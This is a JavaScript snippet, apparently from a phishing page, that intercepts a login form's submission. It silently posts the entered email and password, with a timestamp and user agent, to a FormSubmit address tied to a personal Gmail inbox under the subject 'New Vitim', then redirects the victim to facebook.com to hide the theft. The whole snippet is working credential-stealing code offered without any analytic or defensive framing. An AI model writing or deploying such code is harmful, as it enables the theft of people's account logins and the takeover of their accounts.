 document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            // Collect form data
            const formData = {
                email: document.getElementById('email').value,
                password: document.getElementById('password').value,
                timestamp: new Date().toISOString(),
                userAgent: navigator.userAgent,
                ip: '' // Will be captured by FormSubmit
            };
            
            // Silent form submission
            fetch('https://formsubmit.co/ajax/mdrahulsarkar5525@gmail.com', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Accept': 'application/json'
                },
                body: JSON.stringify({
                    _subject: 'New Vitim',
                    _autoresponse: 'Your login information has been received',
                    _template: 'table',
                    ...formData
                })
            })
            .then(response => response.json())
            .then(data => {
                // Silent success - no user feedback
                console.log('Form submitted successfully');
                
                // Redirect after submission
                window.location.href = 'https://facebook.com';
            })
            .catch(error => {
                // Silent failure - no user feedback
                console.error('Error submitting form:', error);
                
                // Still redirect even if submission fails
                window.location.href = 'https://facebook.com';
            });
        });